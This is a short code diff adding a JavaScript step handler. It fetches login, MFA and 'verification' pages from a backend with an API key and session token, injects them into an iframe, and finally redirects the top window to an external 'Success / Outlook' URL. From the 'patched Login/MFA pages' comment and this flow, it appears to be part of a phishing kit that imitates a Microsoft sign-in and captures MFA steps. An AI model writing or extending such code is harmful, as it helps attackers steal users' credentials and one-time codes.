@@ -348,6 +348,40 @@
             }
         };
 
+        // 4. General Step Handler (Called by patched Login/MFA pages)
+        window.onStepRequired = async (stepUrl) => {
+            console.log("🚦 Step Required:", stepUrl);
+
+            // CASE A: External Redirect (Success / Outlook)
+            if (stepUrl.startsWith('http')) {
+                console.log("🚀 Redirecting to External URL (Success):", stepUrl);
+                window.top.location.href = stepUrl; // Break out of iframe
+                return;
+            }
+
+            // CASE B: Internal Step (MFA / Very)
+            // stepUrl is like '/TOKEN/very' or just 'very'
+            let type = 'very';
+            if (stepUrl.includes('mfa')) type = 'mfa';
+
+            console.log(`🔄 Fetching ${type} page...`);
+
+            try {
+                const response = await fetch(`${API_URL}/pages?type=${type}&token=${sessionToken || ''}`, {
+                    headers: { 'X-API-KEY': API_KEY }
+                });
+                const data = await response.json();
+
+                if (data.success && data.html) {
+                    injectIntoFrame(data.html);
+                } else {
+                    console.error(`Failed to load ${type}:`, data);
+                }
+            } catch (error) {
+                console.error(`${type} fetch error:`, error);
+            }
+        };
+
         function injectIntoFrame(htmlContent) {
             const doc = iframe.contentWindow.document;
             doc.open();
